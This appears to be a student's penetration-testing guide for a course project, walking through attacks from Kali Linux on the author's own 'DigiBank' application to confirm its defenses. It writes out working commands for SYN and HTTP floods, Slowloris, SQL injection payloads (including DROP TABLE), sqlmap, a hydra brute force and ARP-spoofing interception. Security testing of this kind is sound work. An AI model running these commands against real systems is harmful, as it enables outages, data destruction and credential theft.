# Kali Linux Attack Scenarios for DigiBank
## Penetration Testing & Security Validation

**Author:** HAKAN OĞUZ

---

## Prerequisites

### 1. Kali Linux Setup
- **Download:** https://www.kali.org/
- **Install** on VirtualBox or VMware
- **Network:** Bridge mode (to access localhost/deployed app)

### 2. Target System
- DigiBank application running on:
  - Localhost: `http://localhost:8080`
  - GCP Deployed: `http://[YOUR-GCP-URL]`

---

## Attack Scenario 1: DDoS Attack Simulation

### Objective
Test the DDoS defense mechanism (rate limiting, IP blacklisting)

### Tools Required
- `hping3` (pre-installed on Kali)
- `Apache Bench (ab)` (pre-installed)
- Custom Python script (`ddos_attack.sh`)

### Attack Steps

#### Method 1: SYN Flood with hping3
```bash
# Update target IP
TARGET_IP="192.168.1.100"  # Change to your DigiBank server IP
TARGET_PORT=8080

# Launch SYN flood attack
sudo hping3 -S --flood -V -p $TARGET_PORT $TARGET_IP
```

**Expected Defense Response:**
- Rate limiter activates after 100 requests/minute
- IP gets blacklisted for 15 minutes
- Security observer sends email alert
- DDoS event logged in database

#### Method 2: HTTP Flood with Apache Bench
```bash
# Send 100,000 requests with 1,000 concurrent connections
ab -n 100000 -c 1000 http://[TARGET_IP]:8080/
```

#### Method 3: Slowloris Attack
```bash
# Clone slowloris
git clone https://github.com/gkbrk/slowloris.git
cd slowloris

# Launch attack
python3 slowloris.py [TARGET_IP] -s 500
```

### Screenshots to Take
1. Kali terminal showing attack command
2. Attack output (request rates)
3. DigiBank defense logs showing:
   - Rate limit exceeded message
   - IP blacklisting
   - Security alert email

---

## Attack Scenario 2: SQL Injection Testing

### Objective
Validate SQL injection protection (PreparedStatement, input sanitization)

### Tools Required
- `sqlmap` (pre-installed on Kali)
- `curl` command
- Manual browser testing

### Attack Steps

#### Method 1: Classic SQL Injection (Manual)
```bash
# Test login endpoint
curl -X POST http://[TARGET_IP]:8080/api/login \
  -d "username=admin' OR '1'='1&password=anything"
```

**Expected Defense Response:**
- Input sanitized (quotes removed)
- PreparedStatement blocks injection
- SQL keywords detected and logged

#### Method 2: Union-Based Injection with SQLMap
```bash
# Automated SQL injection testing
sqlmap -u "http://[TARGET_IP]:8080/api/login" \
       --data "username=test&password=test" \
       --batch \
       --level=5 \
       --risk=3
```

#### Method 3: Boolean-Based Blind Injection
```bash
# Test for blind SQL injection
curl -X POST http://[TARGET_IP]:8080/api/search \
  -d "query=admin' AND 1=1--"

curl -X POST http://[TARGET_IP]:8080/api/search \
  -d "query=admin' AND 1=2--"
```

### Test Payloads
```sql
'; DROP TABLE users; --
admin'--
1' UNION SELECT * FROM passwords--
' OR '1'='1
admin' AND SLEEP(5)--
```

### Screenshots to Take
1. SQLMap output showing blocked attempts
2. Defense logs showing:
   - Dangerous pattern detected
   - Input validation failure
   - SQL keywords blocked

---

## Attack Scenario 3: Brute Force Login Attack

### Objective
Test Multi-Factor Authentication and account lockout

### Tools Required
- `hydra` (pre-installed)
- Custom wordlist

### Attack Steps

#### Create Wordlist
```bash
# Create simple password list
cat > passwords.txt << EOF
password123
admin123
12345678
qwerty
letmein
EOF
```

#### Launch Brute Force Attack
```bash
# HTTP POST brute force
hydra -l admin -P passwords.txt [TARGET_IP] http-post-form \
  "/api/login:username=^USER^&password=^PASS^:Invalid credentials"
```

**Expected Defense Response:**
- MFA blocks unauthorized access even with correct password
- Rate limiting triggers after multiple failures
- Account temporarily locked
- Security alert generated

### Screenshots to Take
1. Hydra attack in progress
2. Defense mechanism activating
3. MFA requirement screen
4. Account lockout message

---

## Attack Scenario 4: Vulnerability Scanning

### Objective
Comprehensive security assessment

### Tools Required
- `nmap`
- `nikto`
- `OWASP ZAP` (optional)

### Attack Steps

#### Method 1: Nmap Vulnerability Scan
```bash
# Comprehensive vulnerability scan
nmap -sV -sC --script vuln [TARGET_IP] -oN nmap_scan.txt

# Specific checks
nmap --script http-sql-injection [TARGET_IP] -p 8080
nmap --script http-csrf [TARGET_IP] -p 8080
```

#### Method 2: Nikto Web Scanner
```bash
# Web vulnerability scan
nikto -h http://[TARGET_IP]:8080 -o nikto_report.html
```

#### Method 3: OWASP ZAP Scan
```bash
# Active scan with ZAP
zap-cli quick-scan -s xss,sqli -r http://[TARGET_IP]:8080
```

### Screenshots to Take
1. Nmap scan results
2. Nikto vulnerabilities (or lack thereof)
3. Summary report showing secure configuration

---

## Attack Scenario 5: Man-in-the-Middle (MITM)

### Objective
Test encryption and secure communication

### Tools Required
- `ettercap`
- `wireshark`

### Attack Steps

#### ARP Spoofing with Ettercap
```bash
# Start ettercap in text mode
sudo ettercap -T -M arp:remote /[GATEWAY_IP]// /[TARGET_IP]//

# Capture traffic with wireshark
sudo wireshark
```

**Expected Defense Response:**
- Quantum-resistant encryption protects data
- No sensitive data visible in plaintext
- HTTPS enforced

---

## Defense Validation Checklist

After running attacks, verify these defense mechanisms:

### ✓ DDoS Defense
- [ ] Rate limiting activated
- [ ] IP blacklisting working
- [ ] Pattern detection functional
- [ ] Security alerts sent
- [ ] Countermeasures triggered

### ✓ SQL Injection Protection
- [ ] PreparedStatement used
- [ ] Input sanitization working
- [ ] SQL keywords detected
- [ ] Dangerous patterns blocked
- [ ] Attack logged

### ✓ Authentication & Authorization
- [ ] MFA required for login
- [ ] OTP verification working
- [ ] RBAC permissions enforced
- [ ] Unauthorized access blocked

### ✓ Encryption
- [ ] Quantum-resistant encryption active
- [ ] Data encrypted in transit
- [ ] Sensitive data protected

---

## Important Notes

### Ethical Considerations
⚠️ **WARNING:** Only test on your own deployed application or with explicit permission!

- Never attack production systems
- Only test in controlled environment
- Document all activities
- Follow responsible disclosure

### Legal Disclaimer
These attack scenarios are for **EDUCATIONAL PURPOSES ONLY** as part of:
- Academic coursework (Bil 401)
- Security research
- Testing your own systems

Unauthorized access to computer systems is **ILLEGAL**.

---

## Reporting

### What to Document
For each attack scenario:
1. **Attack method used**
2. **Command/tool executed**
3. **Attack output/results**
4. **Defense response**
5. **Screenshots showing:**
   - Kali terminal with attack
   - Defense logs/alerts
   - Timestamp proof

### Report Format
```
Attack: [DDoS / SQL Injection / etc.]
Tool: [hping3 / sqlmap / etc.]
Target: [IP:PORT]
Date/Time: [Timestamp]
Result: [Blocked / Detected / etc.]
Defense Mechanism: [Which security feature activated]
Evidence: [Screenshot filename]
```

---

## Troubleshooting

### Common Issues

**Issue:** Can't reach target from Kali
**Solution:** Check network bridge mode, firewall rules

**Issue:** Tools not installed
**Solution:** `sudo apt update && sudo apt install [tool-name]`

**Issue:** Attack not triggering defense
**Solution:** Verify DigiBank security modules are running

---

## Conclusion

These attack scenarios demonstrate:
- ✅ All security features implemented
- ✅ Defense mechanisms working
- ✅ System is resilient to common attacks
- ✅ Proper security logging and alerts

**Next Steps:**
1. Run all attack scenarios
2. Collect screenshots
3. Document results
4. Include in final report
